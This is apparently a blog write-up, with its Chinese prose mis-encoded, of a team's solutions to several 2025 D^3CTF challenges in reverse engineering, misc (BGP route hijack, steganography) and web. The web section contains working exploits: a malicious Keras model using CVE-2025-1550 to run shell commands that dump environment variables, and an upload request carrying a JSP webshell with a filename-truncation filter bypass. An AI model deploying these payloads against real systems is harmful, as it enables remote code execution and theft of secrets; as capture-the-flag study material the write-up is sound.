---
title: 2025 D^3CTF éƒ¨åˆ†é¢˜è§£
tags: Writeup
categories: Writeup
date: 2025-06-01 23:00:00
toc: true
---

å’¦ï¼Ÿæœ‰ç€æ•¸å–

![](../images/2025-D3CTF/board.webp)

<!--more-->

# Reverse

## AliceInPuzzle

çˆ¶å­è°ƒè¯•è¿›ç¨‹ï¼Œå­è¿›ç¨‹åˆ›å»ºpuzzleåŒ¿åæ–‡ä»¶ç„¶åå¡payloadè¿›å»å¯åŠ¨ï¼›çˆ¶è¿›ç¨‹ä¸»è¦çœ‹ä¸¤ä¸ªï¼šä¿¡å·ä¸ºSIGTRAPæ—¶æ£€æŸ¥å½“å‰æŒ‡ä»¤æ˜¯ä¸æ˜¯`BRK`ï¼Œæ˜¯çš„è¯patchæˆ`NOP`å¹¶ä¸€ç›´è§£å¯†æŒ‡ä»¤åˆ°ä¸‹ä¸€ä¸ª`BRK`ã€‚ä¿¡å·ä¸ºSIGSTOPå°±æŠŠç»™å®šçš„å­—ç¬¦ä¸²å‰åé¢ å€’è¿‡æ¥ã€‚

traceeçš„mainæ˜¯ç©ºçš„ï¼Œå…¨å±€æœ`0xD4200000`å¯ä»¥æ‰¾åˆ°åœ¨`.init_proc`çš„ä¸»é€»è¾‘ï¼Œåªä¸è¿‡è¢«åŠ å¯†äº†ï¼Œå†™ä¸ªè„šæœ¬ä¸€è·¯è§£å¯†ä¸‹å»å°±å®Œäº‹ï¼š

```Python
from idc import *
from ida_bytes import *

def patch_code(addr):
    while True:
        before = get_dword(addr)
        after = (before + 0xE3201F) & 0xFFFFFFFF
        patch_dword(addr, after)
        if after == 0xD4200000:
            break
        addr += 4
    print(f"final address: {hex(addr)}")

# ä»BRKçš„ä¸‹ä¸€æ¡æŒ‡ä»¤å¼€å§‹ï¼ŒBRKæŒ‡ä»¤æœ¬èº«patchä¸ºNOP
patch_code(0x4020C4)
```

ç¨å¾®æ•´ç†ä¸‹ä»£ç ï¼Œç”¨pythonå†™å®Œé€»è¾‘å–‚claudeè¿™ä¸ªéªŒè¯é€»è¾‘æ˜¯åœ¨å¹²å˜›ï¼š

> æ ¹æ®ä»£ç åˆ†æï¼Œè¿™æ˜¯ä¸€ä¸ª**æ•°å­—å¡«å……è°œé¢˜**ï¼ˆç±»ä¼¼äºæ•°ç‹¬çš„å˜ä½“ï¼‰ï¼Œå…·ä½“è§„åˆ™å¦‚ä¸‹ï¼š
> 
> **è°œé¢˜è§„åˆ™**
> 
> 1. **9x9ç½‘æ ¼**ï¼šæ¸¸æˆåœ¨ä¸€ä¸ª9Ã—9çš„ç½‘æ ¼ä¸Šè¿›è¡Œ
>   
> 2. **è¿é€šåŒºåŸŸè§„åˆ™**ï¼šæ¯ä¸ªæ•°å­—æ‰€åœ¨çš„**è¿é€šåŒºåŸŸå¤§å°å¿…é¡»ç­‰äºè¯¥æ•°å­—çš„å€¼**
>   
> 3. **è¿é€šæ€§å®šä¹‰**ï¼šç›¸åŒæ•°å­—çš„ç›¸é‚»æ ¼å­ï¼ˆä¸Šä¸‹å·¦å³å››ä¸ªæ–¹å‘ï¼‰ç»„æˆè¿é€šåŒºåŸŸ
>   
> 4. **åˆå§‹çº¦æŸ**ï¼šæŸäº›ä½ç½®å·²ç»é¢„è®¾äº†æ•°å­—ï¼Œä¸èƒ½ä¿®æ”¹
>   

æœ¬æ¥æƒ³æ‰¾ä¸ªæ­£ç»ç®—æ³•æ±‚è§£ä¸‹ï¼Œç»“æœé˜Ÿå‹ç”¨çªçœ¼æ³•ç›´æ¥ç§’äº†ï¼Œå˜»å˜»

![](../images/2025-D3CTF/image1.webp)

```Python
game_mat = [
    3, 6, 6, 6, 6, 6, 6, 2, 2,
    3, 3, 2, 2, 4, 4, 3, 3, 1,
    6, 6, 6, 6, 5, 4, 4, 3, 6,
    6, 2, 2, 6, 5, 6, 6, 6, 6, 
    4, 7, 7, 7, 5, 5, 5, 8, 6, 
    4, 4, 4, 7, 7, 6, 3, 8, 8, 
    5, 6, 6, 6, 7, 6, 3, 3, 8, 
    5, 6, 6, 6, 7, 6, 6, 8, 8, 
    5, 5, 5, 2, 2, 6, 6, 8, 8
]

m = get_input_bytes(game_mat)
m = bytes(m).hex()
m = m[::-1]

import hashlib
print(hashlib.md5(m.encode()).hexdigest())
```

## d3rpg-revenge

ä¸€çœ¼rpgmakeråšçš„rpgï¼Œä¸è¿‡ä»æ¥æ²¡é€†è¿‡ï¼Œçjbé€†äº†ã€‚`d3rpg.exe`å°±æ˜¯ä¸ªå¯åŠ¨ç¨‹åºï¼Œ`d3rpg.dll`æ˜¯ä¸»ä½“ï¼Œ`RGSSGameMain`ä¼šå¼•ç”¨`d3rpg.d3ssad`ï¼Œå¯èƒ½æ˜¯ä»€ä¹ˆåŠ å¯†æ•°æ®åŒ…ï¼Œç»™æ–‡ä»¶åä¸‹ç¡¬æ–­è·Ÿåˆ°`0x1000A7E0`å¯ä»¥æ‰¾åˆ°è§£å¯†ç›¸å…³ä»£ç ã€‚ä¾æ ·ç”»è‘«èŠ¦å†™ä¸ªè„šæœ¬è§£å¯†ï¼š

```Python
ssad = open('d3rpg.d3ssad', 'rb').read()[8:]

def get_dword(data, offset):
    return int.from_bytes(data[offset:offset + 4], 'little')

def decrypt_data(data: bytes, subkey: int) -> bytes:
    res = b''
    for i in range(0, len(data), 4):
        dword = get_dword(data, i)
        decrypted_dword = dword ^ subkey
        subkey = (9 * subkey + 114) & 0xffffffff
        res += decrypted_dword.to_bytes(4, 'little')
    return res

idx = 0
key = 0xCBAAFBEE

# æ ¼å¼ï¼š4å­—èŠ‚æ–‡ä»¶åé•¿åº¦ | æ–‡ä»¶å | 4å­—èŠ‚æ•°æ®é•¿åº¦ | æ•°æ®
# éƒ½éœ€è¦è§£å¯†ï¼Œè§£å¯†åçš„æ•°æ®æ”¾åœ¨./assets/ç›®å½•ä¸‹ï¼Œå¿…è¦æ—¶éœ€è¦åˆ›å»ºæ–‡ä»¶å¤¹
while idx < len(ssad):
    name_len = get_dword(ssad, idx)
    name_len ^= key
    key = (9 * key + 114) & 0xffffffff
    idx += 4

    name = bytearray(ssad[idx:idx + name_len])
    for i in range(name_len):
        name[i] ^= key & 0xff
        key = (9 * key + 114) & 0xffffffff
    name = name.decode('utf-8')
    idx += name_len

    data_len = get_dword(ssad, idx)
    data_len ^= key
    key = (9 * key + 114) & 0xffffffff
    idx += 4

    data = ssad[idx:idx + data_len]
    decrypted_data = decrypt_data(data, key)
    idx += data_len

    # æ”¹ç”¨osè·¯å¾„ï¼Œåœ¨æ–‡ä»¶å¤¹ä¸å­˜åœ¨çš„æ—¶å€™ä¼šåˆ›å»ºæ–‡ä»¶å¤¹
    import os
    os.makedirs(os.path.dirname(f'./assets/{name}'), exist_ok=True)
    with open(f'./assets/{name}', 'wb') as f:
        f.write(decrypted_data)
```

è¿™æ ·å°±æŠŠæ•°æ®è§£åŒ…äº†ï¼Œä½†æœ‰å¾ˆå¤šrxdataæ–‡ä»¶ä¸çŸ¥é“æ˜¯å¹²å•¥çš„ï¼Œæœäº†ä¸€ä¸‹è¯´æ˜¯rubyçš„åºåˆ—åŒ–æ–‡ä»¶ä»€ä¹ˆçš„ï¼Œæ‰¾ä¸ªå¼€æºé¡¹ç›®è§£æä¸‹ï¼šhttps://github.com/GamingLiamStudios/rxdataToJSON

`Map002.rxdata`å°±æœ‰ç›¸å…³çš„flagæ£€æµ‹é€»è¾‘ï¼Œè¾“å…¥flagåä¼šè§¦å‘`check`å‡½æ•°è¿›è¡Œæ£€æŸ¥ï¼Œé—®é¢˜å°±æ˜¯è¿™ä¸ª`check`å‡½æ•°æ˜¯åœ¨å“ªã€‚

é—®claudeè¯´æ˜¯æœ‰ä¸ª`Scripts.rxdata`ä¼šæœ‰ç›¸åº”é€»è¾‘ï¼Œä½†è§£åŒ…å‡ºæ¥çš„æ–‡ä»¶æ²¡è¿™ä¸ªåå­—ï¼Œç»“æœæŠŠæ–‡ä»¶`Unknown`æ”¹æˆ`Scripts.rxdata`å†å–‚rxdataToJSONå°±è¡Œäº†ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æ•…æ„çš„ğŸ˜…

æ¥ä¸‹æ¥å°±æ˜¯ç®€å•rubyæºç é˜…è¯»äº†ï¼Œå®é™…æ£€æŸ¥å°±ä¸€ç‚¹åè°ƒè¯•+xxteaï¼Œç›´æ¥è§£å¯†å°±è¡Œï¼š

```C
#include <stdio.h>  
#include <stdint.h>  
#define DELTA 0xf1919810  
#define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)^e] ^ z)))  
  
void btea(uint32_t *v, int n, uint32_t const key[4])  
{  
    uint32_t y, z, sum;  
    unsigned p, rounds, e;  
    if (n > 1)            /* Coding Part */  
    {  
        rounds = 6 + 52/n;  
        sum = 0;  
        z = v[n-1];  
        do  
        {  
            sum += DELTA;  
            e = (sum >> 2) & 3;  
            for (p=0; p<n-1; p++)  
            {  
                y = v[p+1];  
                z = v[p] += MX;  
            }  
            y = v[0];  
            z = v[n-1] += MX;  
        }  
        while (--rounds);  
    }  
    else if (n < -1)      /* Decoding Part */  
    {  
        n = -n;  
        rounds = 6 + 52/n;  
        sum = rounds*DELTA;  
        y = v[0];  
        do  
        {  
            e = (sum >> 2) & 3;  
            for (p=n-1; p>0; p--)  
            {  
                z = v[p-1];  
                y = v[p] -= MX;  
            }  
            z = v[n-1];  
            y = v[0] -= MX;  
            sum -= DELTA;  
        }  
        while (--rounds);  
    }  
}  

int main()
{
    char enc[] = {46, 21, 111, 125, 234, 114, 192, 82, 44, 29, 191, 6, 242, 67, 93, 187, 143, 73, 222, 77, 0};
    char key[] = "rpgmakerxp_D3CTF";

    uint32_t *v = (uint32_t *)enc;
    btea(v, -5, (uint32_t *)key);
    for (int i = 0; i < 20; i++) {
        printf("%c", enc[i]);
    }
}
```

---

# Misc

## d3RPKI

`t2-3` **å®é™…ä¸Šå¹¶æ²¡æœ‰é€šè¿‡** **BGP** **å®£å‘Šå®ƒè‡ªå·±æ‰€åœ¨çš„** **`10.4.0.0/24`** **ç½‘æ®µ**ã€‚å› æ­¤ï¼Œ

t2-1ä½¿ç”¨æ‰‹æ³•æ˜¾å¾—æ¶ˆæ¯æ˜¯t2-3å‘çš„ï¼Œå®£å‘Š10.4.0.5æ”¶flagã€‚

```Plain
protocol bgp t1_modified_export from BGP_peers {
    local 10.0.0.2 as 4211110002;
    neighbor 10.0.0.1 as 4211110001; # This is t1
    ipv4 {
        export filter {
            if net = 10.4.0.5/32 then {
                        bgp_path.empty; 
                        bgp_path.prepend(4211110004); # Path becomes (4211110004)
                accept;
            }
            if source ~ [RTS_STATIC, RTS_BGP] then accept;
            reject;
        };
    };
}
```

---

## d3image

solve.py

```Python
import torch
from model import Model
from utils import DWT, IWT, bits_to_bytearray, bytearray_to_text
import torchvision
from collections import Counter
from PIL import Image
import torchvision.transforms as T

# å›¾åƒé¢„å¤„ç†å˜æ¢
transform_test = T.Compose(
    [
        T.CenterCrop((720, 1280)),
        T.ToTensor(),
    ]
)

class INV_block_inverse:
    """INV_blockçš„é€†å‘æ“ä½œå®ç°"""

    def __init__(self, inv_block, clamp=2.0):
        self.inv_block = inv_block
        self.channels = 3
        self.clamp = clamp

    def e(self, s):
        return torch.exp(self.clamp * 2 * (torch.sigmoid(s) - 0.5))

    def inverse(self, y):
        """INV_blockçš„é€†å‘æ“ä½œ"""
        y1, y2 = (
            y.narrow(1, 0, self.channels * 4),
            y.narrow(1, self.channels * 4, self.channels * 4),
        )

        # é€†å‘è®¡ç®— y1 -> x1, y2 -> x2
        # åŸå§‹: y1 = x1 + f(x2), y2 = e(s1) * x2 + t1
        # é€†å‘: x1 = y1 - f(x2), x2 = (y2 - t1) / e(s1)

        # é¦–å…ˆéœ€è¦ä»y1è®¡ç®—s1å’Œt1
        s1, t1 = self.inv_block.r(y1), self.inv_block.y(y1)

        # è®¡ç®—x2
        x2 = (y2 - t1) / self.e(s1)

        # è®¡ç®—x1
        t2 = self.inv_block.f(x2)
        x1 = y1 - t2

        return torch.cat((x1, x2), 1)

def load_model(model_path):
    """åŠ è½½é¢„è®­ç»ƒæ¨¡å‹"""
    state_dicts = torch.load(model_path, map_location=device)
    network_state_dict = {
        k: v for k, v in state_dicts["net"].items() if "tmp_var" not in k
    }
    d3net.load_state_dict(network_state_dict)
    print("æ¨¡å‹åŠ è½½æˆåŠŸï¼")

def transform2tensor(img_path):
    """å°†å›¾åƒè½¬æ¢ä¸ºå¼ é‡"""
    img = Image.open(img_path)
    img = img.convert("RGB")
    return transform_test(img).unsqueeze(0).to(device)

def decode_with_inverse_network(steg_img_path, cover_img_path):
    """ä½¿ç”¨é€†å‘ç½‘ç»œè¿›è¡Œè§£ç """
    print(f"æ­£åœ¨ä½¿ç”¨é€†å‘ç½‘ç»œè§£ç å›¾åƒ: {steg_img_path}")

    # åŠ è½½å›¾åƒ
    steg_tensor = transform2tensor(steg_img_path)
    cover_tensor = transform2tensor(cover_img_path)
    B, C, H, W = steg_tensor.size()

    # å°æ³¢å˜æ¢
    steg_dwt = dwt(steg_tensor)
    cover_dwt = dwt(cover_tensor)

    # åˆ›å»ºé€†å‘ç½‘ç»œå®ä¾‹
    inv_blocks = [
        INV_block_inverse(d3net.model.inv1),
        INV_block_inverse(d3net.model.inv2),
        INV_block_inverse(d3net.model.inv3),
        INV_block_inverse(d3net.model.inv4),
        INV_block_inverse(d3net.model.inv5),
        INV_block_inverse(d3net.model.inv6),
        INV_block_inverse(d3net.model.inv7),
        INV_block_inverse(d3net.model.inv8),
    ]

    with torch.no_grad():
        # æ„é€ ç½‘ç»œè¾“å‡ºï¼ˆæˆ‘ä»¬æœ‰éšå†™å›¾åƒï¼Œéœ€è¦æ‰¾åˆ°åŸå§‹è½½è·ï¼‰
        # å‡è®¾ç½‘ç»œè¾“å‡ºæ˜¯ [steg_dwt, unknown_payload_dwt]
        # æˆ‘ä»¬éœ€è¦é€†å‘æ¨å¯¼å‡ºè¾“å…¥ [cover_dwt, original_payload_dwt]

        # å°è¯•ä¸åŒçš„è½½è·é‡æ„
        zero_payload_dwt = dwt(torch.zeros(B, C, H, W).to(device))

        # æ„é€ å‡è®¾çš„ç½‘ç»œè¾“å‡º
        assumed_output = torch.cat([steg_dwt, zero_payload_dwt], dim=1)

        # é€šè¿‡é€†å‘ç½‘ç»œé“¾è¿›è¡Œåå‘ä¼ æ’­
        current = assumed_output
        for inv_block in reversed(inv_blocks):
            try:
                current = inv_block.inverse(current)
                print(f"é€†å‘å—å¤„ç†å®Œæˆï¼Œå½“å‰å¼ é‡å½¢çŠ¶: {current.shape}")
            except Exception as e:
                print(f"é€†å‘å¤„ç†å‡ºç°é”™è¯¯: {e}")
                break

        # æå–é‡æ„çš„è½½è·
        if current.shape[1] >= 24:
            reconstructed_cover_dwt = current.narrow(1, 0, 12)
            reconstructed_payload_dwt = current.narrow(1, 12, 12)

            # è½¬æ¢å›ç©ºé—´åŸŸ
            reconstructed_payload = iwt(reconstructed_payload_dwt)

            # éªŒè¯é‡æ„çš„è½½ä½“å›¾åƒæ˜¯å¦æ¥è¿‘åŸå§‹è½½ä½“å›¾åƒ
            reconstructed_cover = iwt(reconstructed_cover_dwt)
            cover_diff = torch.mean(torch.abs(reconstructed_cover - cover_tensor))
            print(f"é‡æ„è½½ä½“å›¾åƒä¸åŸå§‹è½½ä½“å›¾åƒçš„å·®å¼‚: {cover_diff.item()}")

            # æå–äºŒè¿›åˆ¶ä½
            secret_bits = reconstructed_payload.view(-1) > 0
            bits = secret_bits.data.int().cpu().numpy().tolist()

            print(f"ä»é‡æ„è½½è·ä¸­æå–åˆ° {len(bits)} ä¸ªäºŒè¿›åˆ¶ä½")

            # å°è¯•è§£ç 
            candidates = Counter()
            try:
                byte_data = bits_to_bytearray(bits)
                for candidate in byte_data.split(b"\x00\x00\x00\x00"):
                    if len(candidate) > 0:
                        decoded_text = bytearray_to_text(bytearray(candidate))
                        if decoded_text and (
                            "d3ctf{" in decoded_text or "flag" in decoded_text.lower()
                        ):
                            candidates[decoded_text] += 1
                            print(f"æ‰¾åˆ°å€™é€‰flag: {decoded_text}")
            except Exception as e:
                print(f"è§£ç è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯: {e}")

            if len(candidates) > 0:
                best_candidate, count = candidates.most_common(1)[0]
                return best_candidate

    return None

def simple_difference_analysis(steg_img_path, cover_img_path):
    """ç®€å•çš„å·®å¼‚åˆ†ææ–¹æ³•"""
    print("å°è¯•ç®€å•å·®å¼‚åˆ†æ...")

    steg_tensor = transform2tensor(steg_img_path)
    cover_tensor = transform2tensor(cover_img_path)

    # ç›´æ¥è®¡ç®—åƒç´ å·®å¼‚
    diff = steg_tensor - cover_tensor

    # å°è¯•å°†å·®å¼‚è½¬æ¢ä¸ºäºŒè¿›åˆ¶ä¿¡æ¯
    # æ–¹æ³•1: åŸºäºå·®å¼‚çš„ç¬¦å·
    diff_binary = (diff > 0).float()
    bits1 = diff_binary.view(-1).data.int().cpu().numpy().tolist()
    result1 = try_decode_bits(bits1, "å·®å¼‚ç¬¦å·æ³•")

    # æ–¹æ³•2: åŸºäºå·®å¼‚çš„é˜ˆå€¼
    threshold = torch.std(diff) * 0.5
    diff_binary2 = (torch.abs(diff) > threshold).float()
    bits2 = diff_binary2.view(-1).data.int().cpu().numpy().tolist()
    result2 = try_decode_bits(bits2, "å·®å¼‚é˜ˆå€¼æ³•")

    return result1 or result2

def try_decode_bits(bits, method_name):
    """å°è¯•ä»äºŒè¿›åˆ¶ä½è§£ç æ–‡æœ¬"""
    print(f"{method_name}: æå–åˆ° {len(bits)} ä¸ªäºŒè¿›åˆ¶ä½")

    candidates = Counter()

    try:
        # å°è¯•ä¸åŒçš„èµ·å§‹ä½ç½®ï¼Œå› ä¸ºä¿¡æ¯å¯èƒ½ä¸æ˜¯ä»ç¬¬0ä½å¼€å§‹çš„
        for start_offset in range(0, min(1000, len(bits)), 8):
            trimmed_bits = bits[start_offset:]
            if len(trimmed_bits) < 64:  # è‡³å°‘éœ€è¦8ä¸ªå­—èŠ‚
                continue

            byte_data = bits_to_bytearray(trimmed_bits)
            for candidate in byte_data.split(b"\x00\x00\x00\x00"):
                if len(candidate) > 10:  # è‡³å°‘10å­—èŠ‚æ‰å¯èƒ½æ˜¯æœ‰æ•ˆçš„flag
                    decoded_text = bytearray_to_text(bytearray(candidate))
                    if decoded_text and (
                        "d3ctf{" in decoded_text or "flag" in decoded_text.lower()
                    ):
                        candidates[decoded_text] += 1
                        print(f"{method_name}: æ‰¾åˆ°å€™é€‰flag: {decoded_text}")
    except Exception as e:
        print(f"{method_name}: è§£ç è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯: {e}")
        return None

    if len(candidates) > 0:
        best_candidate, count = candidates.most_common(1)[0]
        print(f"{method_name}: è§£ç æˆåŠŸï¼")
        return best_candidate
    else:
        print(f"{method_name}: æœªæ‰¾åˆ°æœ‰æ•ˆçš„éšè—ä¿¡æ¯")
        return None

if __name__ == "__main__":
    # è®¾ç½®è®¾å¤‡
    device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu")
    print(f"ä½¿ç”¨è®¾å¤‡: {device}")

    # åˆå§‹åŒ–æ¨¡å‹å’Œå°æ³¢å˜æ¢
    d3net = Model(cuda=torch.cuda.is_available())
    d3net.eval()

    dwt = DWT()
    iwt = IWT()

    # åŠ è½½é¢„è®­ç»ƒæ¨¡å‹
    load_model("magic.potions")

    # è§£ç å›¾åƒ
    steg_image = "mysterious_invitation.png"
    cover_image = "poster.png"

    print("æ–¹æ³•1: å°è¯•é€†å‘ç½‘ç»œè§£ç ...")
    flag = decode_with_inverse_network(steg_image, cover_image)

    if not flag:
        print("\næ–¹æ³•2: å°è¯•ç®€å•å·®å¼‚åˆ†æ...")
        flag = simple_difference_analysis(steg_image, cover_image)

    if flag:
        print(f"\nğŸ‰ CTF Flag æ‰¾åˆ°äº†ï¼")
        print(f"Flag: {flag}")
    else:
        print("\nâŒ æ‰€æœ‰è§£ç æ–¹æ³•éƒ½å¤±è´¥äº†")
```

---

## d3rpg-signin

Part0: åœ°ä¸‹å®¤æ‰¾åˆ°æ‘é•¿ï¼Œè´­ä¹°è°ƒè¯•åŠŸèƒ½åå›åˆ°åœ°è¡¨ï¼Œæ‰¾åˆ°åœ°å›¾å³ä¸‹è§’çš„æ°´äº•ï¼Œæ£€æŸ¥å†…å­˜å³å¯æ‰¾åˆ°å¯†ç ã€‚è¾“å…¥åå¾—åˆ°flag0.

![](../images/2025-D3CTF/image2.webp)

![](../images/2025-D3CTF/image3.webp)

part1ï¼š

![](../images/2025-D3CTF/image4.webp)

part2ï¼šåœ°ä¸‹å®¤å†çˆ¬ä¸ªæ´æ‰¾åˆ°å•†äººï¼Œ-255rmbä¼šå˜æˆ+1rmbï¼Œä½†æ˜¯ç¬¬äºŒä»¶å•†å“éœ€è¦128rmb

![](../images/2025-D3CTF/image5.webp)

part3ï¼šåœ°æ¿ä¸Šçš„æ‘©æ–¯å¯†ç 

![](../images/2025-D3CTF/image6.webp)

![](../images/2025-D3CTF/image7.webp)

![](../images/2025-D3CTF/image8.webp)

---

# Web

## tidy quic

~~ä¸éš¾å‘ç°~~ï¼Œå½“å­˜åœ¨ ContentLength çš„æ—¶å€™ï¼Œå°±ä¼šä» BufferPool é‡Œé¢æ‹¿ä¸€ä¸ªå¯¹åº”é•¿åº¦çš„ buffer å‡ºæ¥ç”¨ã€‚å¹¶ä¸”è¯»å– body å†…å®¹çš„æ—¶å€™ï¼Œæ²¡æœ‰æ¸…ç©ºåŸæœ‰ bufferï¼Œä¹Ÿæ²¡æœ‰éªŒè¯è¯»å–å†…å®¹æ˜¯å¦è¾¾åˆ° ContentLength ä¸ª bytesã€‚è¿™å°±å¯¼è‡´å¦‚æœ ContentLength æ¯” body é•¿ï¼Œbuffer åé¢çš„ bytes å°±ä¼šæœ‰ä¹‹å‰ POST çš„å†…å®¹ï¼Œæ‹¼æ¥åçš„å†…å®¹ä¸ä¼šè¢« WAF æ£€æµ‹ã€‚

äºæ˜¯å…ˆæäº¤ `I want __ag` å†æäº¤ `I want fl`ï¼ˆä¸¤è€…çš„ Content-Length éƒ½è®¾ç½®æˆ 11ï¼‰ï¼Œåé¢é‚£ä¸ª POST å°±(å¤§æ¦‚ç‡)ä¼šæ‹¼æˆ `I want flag`ã€‚

```Python
# æ”¹ç¼–è‡ª https://github.com/aiortc/aioquic/blob/main/examples/http3_client.py
configuration = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN, verify_mode=ssl.CERT_NONE)
async with connect('127.0.0.1', '8080', configuration=configuration, create_protocol=HttpClient) as client:
    await client.post('https://127.0.0.1:8080/', data=b'I want __ag', headers={'content-length': '11'})
    events = await client.post('https://127.0.0.1:8080/', data=b'I want fl', headers={'content-length': '11'})
    for event in events:
        if isinstance(event, DataReceived):
            print(f"Data received: {event.data}")
```

---

## d3model

1. Keras < 3.9 RCEæ¼æ´ï¼š CVE-2025-1550
  
2. Exp : https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models
  
3. å®¹å™¨ä¸å‡ºç½‘
  
4. index.html å¯å†™
  
5. ç”¨ä¸‹é¢çš„exp.pyç”Ÿæˆmodel.kerasï¼Œä¸Šä¼ ï¼Œå³å¯çœ‹åˆ°flag
  

Exp:

1. exp.py

```Python
import zipfile
import json
from keras.models import Sequential
from keras.layers import Dense
import numpy as np
import os

model_name="model.keras"

x_train = np.random.rand(100, 28*28)  
y_train = np.random.rand(100) 

model = Sequential([Dense(1, activation='linear', input_dim=28*28)])

model.compile(optimizer='adam', loss='mse')
model.fit(x_train, y_train, epochs=5)
model.save(model_name)

with zipfile.ZipFile(model_name,"r") as f:
    config=json.loads(f.read("config.json").decode())
    
config["config"]["layers"][0]["module"]="keras.models"
config["config"]["layers"][0]["class_name"]="Model"
config["config"]["layers"][0]["config"]={
    "name":"mvlttt",
    "layers":[
        {
            "name":"mvlttt",
            "class_name":"function",
            "config":"Popen",
            "module": "subprocess",
            "inbound_nodes":[{"args":[["echo $(env) >> index.html"]],"kwargs":{"bufsize":-1,"shell": True}}]
        }],
            "input_layers":[["mvlttt", 0, 0]],
            "output_layers":[["mvlttt", 0, 0]]
        }

with zipfile.ZipFile(model_name, 'r') as zip_read:
    with zipfile.ZipFile(f"tmp.{model_name}", 'w') as zip_write:
        for item in zip_read.infolist():
            if item.filename != "config.json":
                zip_write.writestr(item, zip_read.read(item.filename))

os.remove(model_name)
os.rename(f"tmp.{model_name}",model_name)

with zipfile.ZipFile(model_name,"a") as zf:
        zf.writestr("config.json",json.dumps(config))

print("[+] Malicious model ready")
```

2. config.json

```Bash
{
  "config": {
    "layers": [
      {
        "module": "keras.models",
        "class_name": "Model",
        "config": {
          "layers": [
            {
              "module": "keras.models",
              "class_name": "Model",
              "config": {
                "name": "mvlttt",
                "layers": [
                  {
                    "name": "mvlttt",
                    "class_name": "function",
                    "config": "Popen",
                    "module": "subprocess",
                    "inbound_nodes": [
                      {
                        "args": [ [ "echo $(env) >> index.html" ] ],
                        "kwargs": {
                          "bufsize": -1,
                          "shell": true
                        }
                      }
                    ]
                  }
                ],
                "input_layers": [ [ "mvlttt", 0, 0 ] ],
                "output_layers": [ [ "mvlttt", 0, 0 ] ]
              }
            }
          ]
        }
      }
    ]
  }
}
```

---

## d3jtar

jadxåç¼–è¯‘é™æ€åˆ†ææºç å‘ç°ä¸Šä¼ æ–‡ä»¶è¿‡æ»¤äº†å„ç§åç¼€ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ªjspï¼Œå¹¶ä¸”è¿‡æ»¤äº†

ä¸€å¼€å§‹ç›´æ¥ä¸¢ç»™AIåˆ†æäº†ä¸€è½®ï¼Œæ„å»ºå‡ºæ•´ä½“æ¡†æ¶ï¼Œå‘ç°åªæœ‰ä¸‰ä¸ªè·¯ç”±ï¼š`view`ï¼Œ`Backup`ï¼Œ`Upload`

è¿›è¡Œbackupæ“ä½œçš„æ—¶å€™å‘ç°ä¼šå°†viewsä¸‹çš„æ–‡ä»¶ä¿å­˜ä¸ºbackup.tarå½’æ¡£ï¼Œç„¶ååœ¨restoreæ—¶è§£å‹å‡ºæ¥ï¼Œä¸€å¼€å§‹æƒ³åˆ°æ„é€ ä¸€ä¸ªå¸¦æœ‰å¯é€ æˆè·¯å¾„ç©¿è¶Šçš„æ–‡ä»¶çš„backup.tarï¼Œrestoreå‡ºæ¥è·¯å¾„ç©¿è¶Šè¦†ç›–æ‰ä¸€å¼€å§‹çš„backup.tarï¼Œç„¶åå†restoreä¸€æ¬¡æ¥å°†jspé©¬å†™å…¥viewsï¼Œè¯•äº†ï¼Œæ— æœï¼Œuntarçš„æ—¶å€™ä¸ä¼šé€’å½’è§£å‹ï¼Œåç¼–è¯‘çš„ä»£ç ä¹Ÿæ˜¾ç¤ºäº†è¿™ä¸€ç‚¹ã€‚ä½†æ˜¯å‘ç°untarçš„è¿‡ç¨‹æ²¡æœ‰è¿›è¡Œæ£€æŸ¥ï¼Œå¯ä»¥çŒœæµ‹å¤§æ¦‚æ˜¯è¦backupç„¶årestore

POSTä¸Šä¼ jspé©¬

```Python
POST /Upload HTTP/1.1
Host: 35.241.98.126:31160
Content-Length: 710
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryn4OruM32HnKlqw5n
Accept: */*
Origin: http://35.241.98.126:31454
Referer: http://35.241.98.126:31454/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryn4OruM32HnKlqw5n
Content-Disposition: form-data; name="file"; filename="testn.jÅ³p"
Content-Type: application/octet-stream

<%@ page import="java.util.*, java.io.*" %>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
<h1>Webshell Active</h1>
<form method="GET">
    <input type="text" name="cmd" size="80">
    <input type="submit" value="Execute">
</form>
------WebKitFormBoundaryn4OruM32HnKlqw5n--
```

![](../images/2025-D3CTF/image9.webp)

æ‰§è¡Œå‘½ä»¤Get Flag

![](../images/2025-D3CTF/image10.webp)

![](../images/2025-D3CTF/image11.webp)

åˆ†ææºç 

![](../images/2025-D3CTF/image12.webp)

è¿™ä¸ª `getNameBytes` å‡½æ•°å­˜åœ¨ä¸€ä¸ªä¸¥é‡çš„å­—ç¬¦ç¼–ç å¤„ç†æ¼æ´ï¼Œæ ¹æœ¬åŸå› æ˜¯ Unicode å­—ç¬¦è¢«ç›´æ¥æˆªæ–­ä¸ºä½8ä½å­—èŠ‚

```Java
public static int getNameBytes(StringBuffer name, byte[] buf, int offset, int length){
    int i;
    for (i=0; i<length && b  i<name.length(); ++i){
        buf[offset+i] = (byte) name.charAt(i); // æ¼æ´ç‚¹
    }
    for(; i < length; ++i){
        buf[offset+i] = 0;
    }
}
```

å­—ç¬¦è½¬æ¢è¿‡ç¨‹ï¼š

- `name.charAt(i)` è¿”å› 16 ä½ Unicode å­—ç¬¦ï¼ˆ0-65535ï¼‰
  
- `(byte)` å¼ºåˆ¶è½¬æ¢ä¸º 8 ä½å­—èŠ‚ï¼ˆ-128 åˆ° 127ï¼‰
  
- é«˜8ä½æ•°æ®è¢«ä¸¢å¼ƒï¼Œåªä¿ç•™ä½8ä½
  

---

## d3invitation

